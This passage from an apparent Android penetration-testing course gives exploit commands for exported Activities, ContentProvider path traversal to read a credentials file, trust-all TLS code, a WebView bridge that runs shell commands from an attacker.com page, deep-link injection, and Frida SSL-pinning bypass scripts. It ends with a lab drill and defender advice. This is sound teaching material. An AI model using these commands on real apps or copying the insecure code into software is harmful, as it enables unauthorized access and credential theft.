VULNERABILITY:
  Activity marked android:exported="true" contains sensitive functionality
  that expects the user to be authenticated — but doesn't verify this itself.
  
EXPLOIT:
  adb shell am start -n com.victim.app/.AdminActivity
  → Opens admin panel without authentication
  → No login required because the Activity trusts it was reached legitimately

EXAMPLE CODE (vulnerable):
  // AdminActivity.java
  public class AdminActivity extends Activity {
      protected void onCreate(Bundle b) {
          // No auth check — trusts that only authenticated users can reach this
          // But it's exported! Anyone can start it directly via adb or another app.
          displayAdminPanel();
      }
  }

DETECTION: grep manifest for exported Activities, cross-reference with
  Activities that access sensitive data or admin functions
```

### Exported Content Providers — Path Traversal

```
VULNERABILITY:
  ContentProvider is exported without proper path validation.
  openFile() method allows path traversal, leaking arbitrary local files.

EXAMPLE CODE (vulnerable):
  // MyProvider.java
  public ParcelFileDescriptor openFile(Uri uri, String mode) {
      String filename = uri.getLastPathSegment();
      // VULNERABLE: no validation, allows ../../etc/hosts style traversal
      File f = new File(DATA_DIR, filename);
      return ParcelFileDescriptor.open(f, ParcelFileDescriptor.MODE_READ_ONLY);
  }

EXPLOIT:
  # From another app or adb:
  adb shell content read \
    --uri "content://com.victim.app.provider/files/../../../../data/data/com.victim.app/shared_prefs/credentials.xml"

DETECTION: jadx → search for openFile() in ContentProvider subclasses,
  check for path traversal validation
```

### Insecure SharedPreferences

```
VULNERABILITY:
  App stores sensitive data (tokens, passwords, PII) in SharedPreferences
  in plaintext or with weak encoding (base64 ≠ encryption).

EXAMPLE CODE (vulnerable):
  SharedPreferences prefs = getSharedPreferences("user_data", MODE_PRIVATE);
  prefs.edit().putString("auth_token", bearerToken).apply();
  prefs.edit().putString("password", plaintext_password).apply();

DETECTION WITH OBJECTION:
  android preferences dump
  → dumps all SharedPreferences files
  → reveals plaintext credentials

DETECTION WITH ADB (rooted):
  adb pull /data/data/com.victim.app/shared_prefs/
  cat user_data.xml
```

### Improper Certificate Validation

App doesn't properly validate TLS certificates. Allows MitM interception
even without defeating certificate pinning.

```java
// VULNERABLE: trusts all certificates
// This is the "trust everything" antipattern — common in dev code that ships to prod
TrustManager[] trustAllCerts = new TrustManager[] {
    new X509TrustManager() {
        public X509Certificate[] getAcceptedIssuers() { return null; }  // no issuers = accept all
        public void checkClientTrusted(X509Certificate[] certs, String authType) {}   // empty = no check
        public void checkServerTrusted(X509Certificate[] certs, String authType) {}   // empty = no check
        // Empty implementation = trust everything = MitM trivial
    }
};

SSLContext sc = SSLContext.getInstance("TLS");
sc.init(null, trustAllCerts, new java.security.SecureRandom());  // install the permissive trust manager
HttpsURLConnection.setDefaultSSLSocketFactory(sc.getSocketFactory());  // make it the default for all HTTPS

// Also look for:
HostnameVerifier allHostsValid = (hostname, session) -> true;
// ^ overrides hostname verification = any cert for any hostname accepted
```

**Detection**: jadx → search for `X509TrustManager`, `checkServerTrusted`,
`setDefaultSSLSocketFactory`, `ALLOW_ALL_HOSTNAME_VERIFIER`

### WebView addJavascriptInterface

```java
// VULNERABLE: exposes Java methods to JavaScript in WebView
webView.addJavascriptInterface(new JavaBridge(), "Android");  // "Android" = JS object name

class JavaBridge {
    @JavascriptInterface  // annotation required — marks method as callable from JS
    public String executeCommand(String cmd) {
        // CRITICAL: this executes SHELL COMMANDS from JavaScript!
        Process p = Runtime.getRuntime().exec(cmd);  // run cmd as a shell process
        return readStream(p.getInputStream());         // return stdout to JS caller
    }
}

webView.setJavaScriptEnabled(true);                             // JS must be enabled
webView.loadUrl("https://attacker.com/xss_payload.html");      // load attacker-controlled page
// The XSS payload calls: Android.executeCommand("id")
// → Command execution via WebView JavaScript
```

**Detection**: jadx → search for `addJavascriptInterface`. Every occurrence
is potentially exploitable if the WebView loads remote content.

**Prerequisites for exploitation**:
1. WebView has JavaScript enabled
2. WebView loads attacker-controlled content (URL, parameter, XSS)
3. Bridge method has dangerous functionality

### Deep Link Injection

```java
// VULNERABLE: exported Activity handles deep links without validation
// AndroidManifest.xml:
// <intent-filter>
//   <action android:name="android.intent.action.VIEW"/>
//   <data android:scheme="myapp" android:host="callback"/>
// </intent-filter>

public class CallbackActivity extends AppCompatActivity {
    protected void onCreate(Bundle savedInstanceState) {
        Uri data = getIntent().getData();                   // get the URI from the deep link Intent
        // NO VALIDATION: loads any URL from the deep link — attacker controls 'redirect' param
        String url = data.getQueryParameter("redirect");
        startActivity(new Intent(Intent.ACTION_VIEW, Uri.parse(url)));  // open URL in browser — open redirect
        // → open attacker URL in browser, or:
        webView.loadUrl(url);
        // → load attacker-controlled page in app's WebView context
    }
}

// Attack:
adb shell am start -a android.intent.action.VIEW \
    -d "myapp://callback?redirect=javascript:window.location='https://attacker.com/'"
```

---

## Section 6 — Frida SSL Pinning Bypass

Certificate pinning is an app-level check where the app verifies that
the server's certificate matches a specific certificate or public key
hash — not just any trusted CA. Bypassing it lets you intercept traffic
with Burp regardless of which CA signed your Burp cert.

### Universal SSL Pinning Bypass

The standard frida-codeshare script bypasses most common pinning implementations:

```bash
# One-liner universal bypass (covers 90%+ of implementations):
frida --codeshare pcipolloni/universal-android-ssl-pinning-bypass-with-frida \
      -U -f com.victim.app --no-pause

# Or download the script for offline use:
# https://codeshare.frida.re/@pcipolloni/universal-android-ssl-pinning-bypass-with-frida/
```

### Expected Output

**Success looks like:**
```
[*] Frida instrumentation started
[Android Emulator 5554::com.victim.app]-> [+] TrustManager found
[+] Hooking Conscrypt TrustManager
[+] SSLContext.init() calls are now intercepted
```
Then in Burp, requests from the app start appearing in HTTP History.

**Failure looks like: `Script loaded successfully` but Burp still shows nothing — the app uses a custom pinning implementation the universal script doesn't cover. Proceed to Manual Bypass below.**

**What it bypasses:**
- OkHttp3 CertificatePinner
- TrustManagerImpl custom implementations
- HttpsURLConnection custom TrustManagers
- Conscrypt (Android's default SSL provider) trust checks
- Apache HTTP Client
- Retrofit (which uses OkHttp)

**Using objection (wrapped Frida):**
```bash
objection -g com.victim.app explore
# Inside objection:
android sslpinning disable
# → disables SSL pinning for the running process
# → Burp now intercepts all traffic
```

### Manual Bypass (when the universal script fails)

If universal bypass doesn't work, the app uses a custom or obfuscated
pinning implementation. Find it manually:

```bash
# 1. Find pinning code in jadx:
# Search for: CertificatePinner, TrustManager, X509TrustManager, 
#             getServerCertificates, checkServerTrusted

# 2. Identify the specific method doing the pin check
# Usually: throws an exception if the cert doesn't match

# 3. Write a targeted hook:
```

```javascript
// targeted_bypass.js — hook specific custom pinning class
Java.perform(function() {
    // Use the exact class path from jadx — adjust to match what you found:
    var CustomPinner = Java.use("com.victim.app.security.CertificatePinnerImpl");
    
    // Override the verify method to always pass:
    CustomPinner.verify.overload("java.lang.String", "javax.net.ssl.SSLSession")
        .implementation = function(hostname, session) {
            console.log("[BYPASS] SSL pinning bypassed for: " + hostname);
            return true;   // always return true = pin check passes
        };
    
    // Or: overload checkServerTrusted to do nothing (no throw = trust accepted):
    CustomPinner.checkServerTrusted.overload("[Ljava.security.cert.X509Certificate;", "java.lang.String")
        .implementation = function(chain, authType) {
            console.log("[BYPASS] checkServerTrusted bypassed");
            // Return without throwing = trust accepted (original would throw CertificateException)
        };
});
```

### Expected Output

**Success looks like:** The hook script loads without errors, and when the app makes an HTTPS request you see `[BYPASS] SSL pinning bypassed for: api.victim.com` in the Frida console. Burp HTTP history shows the decrypted request.

**Failure looks like: `TypeError: CustomPinner.verify is not a function` — the method name or signature is wrong. Fix: in jadx, find the exact method name in the pinning class and check the exact parameter types. Adjust the `.overload()` arguments to match.**

---

## Analysis Workflow (End to End)

```
ANDROID APK ANALYSIS WORKFLOW:
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

PHASE 1 — RECONNAISSANCE (5 minutes):
  apktool d app.apk -o decoded/
  cat decoded/AndroidManifest.xml | grep -i 'exported="true"'
  cat decoded/AndroidManifest.xml | grep 'uses-permission'
  strings app.apk | grep -iE "http://|password|secret|key="

PHASE 2 — STATIC ANALYSIS (jadx):
  jadx-gui app.apk
  Navigate to main package
  Review: MainActivity, Application subclass, login/auth classes
  Search: SharedPreferences, certificate, HttpURLConnection
  Hunt: hardcoded credentials, exported components, JS interfaces

PHASE 3 — EXPORTED COMPONENT TESTING:
  For each exported Activity/Service/Provider/Receiver:
    adb shell am start/startservice/broadcast ...
    Document accessible functionality
    Test for auth bypass, injection, traversal

PHASE 4 — DYNAMIC ANALYSIS (Frida):
  frida-server running on device
  frida -U -f com.victim.app -l universal_ssl_bypass.js --no-pause
  Burp proxy configured
  Navigate app, observe intercepted traffic
  Hook specific methods as needed (credentials, tokens, logic checks)

PHASE 5 — REPORT:
  Findings per vulnerability class
  CVSS score for each finding
  Evidence: screenshots, Frida script output, Burp requests
  Remediation recommendations
```

---

## DEFENDER TAKEAWAY

You built the attack toolkit. Now use the same knowledge to protect your company's Android-connected environment. These are Monday-morning actions.

- **Audit your MDM policy for sideloading.** If "Unknown sources" or "Install unknown apps" is permitted on corporate devices, any employee can install a malicious APK. Use your MDM (Intune, Jamf, etc.) to enforce this. On Windows, check Intune → Devices → Configuration Profiles → Android Enterprise → App.

- **Ban accessibility service permissions in your MDM policy.** `BIND_ACCESSIBILITY_SERVICE` is how commercial stalkerware and banking trojans read every screen and keypress. No legitimate corporate app needs it. Blocklist it via your MDM app vetting policy.

- **Run MobSF on every APK before it touches your corporate WiFi.** MobSF (Mobile Security Framework) is an open-source static analyser — `pip install mobsf` or run via Docker. Automate APK uploads from your app catalog. Fail any APK with exported Activities that access data, hardcoded credentials, or `setJavaScriptEnabled`.

- **Enforce network traffic inspection at the corporate WiFi perimeter.** Because Frida-based SSL pinning bypass works at runtime, network-level inspection (Palo Alto SSL decryption, Zscaler) gives you a second layer that app-level pinning does not protect against. Log all HTTPS CONNECT requests from mobile devices.

- **Windows detection — monitor for Android tooling on corporate machines.** If an employee is running adb, frida, or objection on their Windows workstation, it warrants investigation. Create a Windows Defender Application Control (WDAC) audit rule for `adb.exe`. Event ID **4688** (Process Creation, requires audit policy enabled) will log it: look for `CommandLine` containing `adb` or `frida`.

- **Require certificate pinning in all internally developed Android apps.** Use the Android `network_security_config.xml` approach — it is enforced by the OS, not bypassable without root, and costs zero lines of Java. Provide a template to your dev team.

- **Check for exported components in every internal app build.** Add a mandatory pre-release step: `apktool d app.apk -o decoded/ && grep -i 'exported="true"' decoded/AndroidManifest.xml`. Any exported component must be justified in the release notes.

- **Windows-specific: Event ID 7045 (new service installed) and 4698 (scheduled task created) catch Android malware persistence mechanisms when a compromised device syncs to a corporate Windows host.** Enable these in your SIEM. Android malware that moves laterally to Windows often installs a service or scheduled task.

---

## Key Terms (Add to Glossary)

| Term | Definition |
|------|-----------|
| **APK** | Android Package; ZIP file containing DEX bytecode, manifest, resources, and native libraries |
| **DEX** | Dalvik Executable; Android's bytecode format compiled from Java/Kotlin source |
| **ART** | Android Runtime; executes DEX bytecode via AOT compilation or interpretation |
| **Binder IPC** | Android's inter-process communication mechanism via /dev/binder kernel driver |
| **AndroidManifest.xml** | App configuration file declaring permissions, components, and intent filters |
| **Exported component** | Activity/Service/Receiver/Provider accessible to other apps; primary Android attack surface |
| **Intent** | Android messaging object used to start Activities, Services, or send broadcasts |
| **jadx** | Decompiler that converts DEX bytecode back to approximate Java source |
| **apktool** | Decodes APK to smali assembly and binary XML to readable formats |
| **Frida** | Dynamic instrumentation framework for hooking methods at runtime |
| **Objection** | Frida-powered runtime mobile exploration tool with pre-built Android analysis commands |
| **Certificate pinning** | App-level check verifying server cert matches hardcoded cert/key; blocks standard MitM |
| **SSL pinning bypass** | Frida script disabling certificate pinning checks at runtime to enable Burp interception |
| **SharedPreferences** | Android key-value storage; often misused for storing plaintext credentials |
| **ContentProvider** | Android component exposing structured data access; common path traversal vulnerability surface |
| **WebView JavascriptInterface** | Bridge exposing Java methods to JavaScript in a WebView; can enable RCE via XSS |
| **Deep link** | URL scheme handled by an exported Activity; injection via unvalidated parameters |
| **smali** | Human-readable assembly language for DEX bytecode; output of apktool decompilation |
| **frida-server** | Native binary deployed to the Android device that Frida tools connect to |
| **adb** | Android Debug Bridge; command-line tool for device communication, shell access, file transfer |

---

## Drill 21 — Mobile Security

Go to `DRILLS/21_mobile_security/`. A vulnerable sample APK (`vulnerable.apk`)
is provided — a banking app simulation with multiple intentional flaws.

Your mission:

1. **Static analysis**.
   - Decompile with apktool and jadx.
   - List all exported components.
   - Find hardcoded credentials (there are 2).
   - Find the insecure SharedPreferences usage.
   - Find the WebView JavascriptInterface vulnerability.

2. **Exported component exploitation**.
   - Send an Intent to bypass the login screen.
   - Read a file via the vulnerable ContentProvider using path traversal.
   - Trigger the exported BroadcastReceiver and document its effect.

3. **Dynamic analysis with Frida**.
   - Set up frida-server on the Android emulator.
   - Hook `SharedPreferences.getString` — capture all values read.
   - Hook the authentication method — log credentials at entry.
   - Modify the return value of `isAdminUser()` to return `true`.

4. **Traffic interception**.
   - Configure Burp proxy.
   - Run universal SSL pinning bypass.
   - Intercept a login request. Capture the token.
   - Replay the token to the API endpoint and confirm access.

5. **Write findings**.
   - One page, DREAD or CVSS score each finding.
   - Proof-of-concept for each vulnerability.
   - This is your mobile pentest report template.

Android is a computer in every pocket. Learn to read it the same way
you read anything else: find the input surfaces, trace the data paths,
look for the places where trust assumptions break.

---

— The APK SURRENDERS its secrets to patient smali —
runtime instrumentation bends the trust model cold
